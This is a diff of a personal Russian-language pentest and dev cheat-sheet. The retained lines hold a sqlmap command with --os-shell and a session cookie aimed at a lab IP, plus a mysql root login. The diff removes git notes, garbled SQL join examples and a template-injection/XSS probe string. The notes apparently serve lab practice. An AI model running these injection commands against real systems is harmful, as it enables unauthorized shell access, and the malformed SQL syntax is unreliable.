@@ -24,31 +24,7 @@ https://tryhackme.com/room/sqlmap - пример использования с �
 
 sqlmap -u 'http://10.129.237.210/dashboard.php?search=FERA' --batch --random-agent --cookie='PHPSESSID=6et2iplhe59a7h6m2v55vjn49s' --os-shell
 
-#set git config values #Авторизация
-git config --global user.name "ваше имя"
-git config --global user.email "ваше_мыло@gmail.com"
-git config --global github.user ник
-git config --global github.token your_token_here#Основные команды гит:
-git clone [url]
-git add . - Добавить все (. - Обозначает текущий каталог со всем содержимым)
-git commit -m "mesage" - Создать комит
-git push - отправить
-git pull - Стянуть
-git rn file_name - удалить из репозитория
-git branch branch_name - создать ветку
-git merge - сливает ветку с текущей
-git status - получить статус
-git checkout - переключение веток (отредактировано) 
-  11:10
-SQL
-**********************************************************
-Select tabl1.col1, tabl2.col1 from tabl1 INNER JOIN tabl2 on id(tabl1)=id(tabl2)Select tabl1.col1, tabl2.col1 from tabl1 OUTER LEFT JOIN tabl2 on id(tabl1)=id(tabl2)
-FULL JOIN and CROSS JOIN (отредактировано) 
 
-
-{{[]."-alert`xxx`-"}}
-
-***********
 # MYSQL server
 
 mysql -h 123.123.131.131 -u root -p
